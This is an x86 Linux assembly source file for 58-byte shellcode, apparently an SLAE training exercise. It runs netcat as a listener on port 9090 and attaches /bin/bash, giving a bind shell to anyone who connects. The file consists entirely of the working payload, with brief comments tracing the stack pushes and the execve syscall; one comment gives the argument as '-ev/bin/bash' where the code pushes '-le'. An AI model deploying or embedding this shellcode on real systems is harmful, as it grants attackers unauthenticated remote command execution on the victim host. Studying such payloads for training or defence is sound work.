;
; Linux x86
; Author:  thryb
; Date:    13-07-16
; Purpose: /bin/nc -lp 9090 -le/bin/bash
; Size:    58 bytes
; ID:      SLAE-770 
;

global _start			

section .text
_start:

	; null
	xor eax, eax
	xor edx, edx	

	; reverse "/bin//nc"
	push eax
	push 0x636e2f2f
	push 0x6e69622f

	; mov "/bin//nc" addr to ebx
        mov ebx, esp

	; reverse "-ev/bin/bash"
	; hsab : 68736162
	; /nib : 2f6e6962
	; /el- : 2f656c2d
	push eax
	push 0x68736162
	push 0x2f6e6962
	push 0x2f656c2d

	; mov "-le/bin/bash" addr to esi
	mov esi, esp

	; reverse "-lp 9090"
	;0909 : 30393039
	; pl- : 20706c2d
	push eax
	push 0x30393039
	push 0x20706c2d

	; mov "-lp 9090" addr to edi
	mov edi, esp
       

	; prep for exec
	push edx ; null
	push esi ; arg2	
	push edi ; arg1
	push ebx ; /bin/nc

	; top of stack to ecx
	mov ecx, esp

	; execve syscall
	mov al, 0xB
	; init
	int 0x80
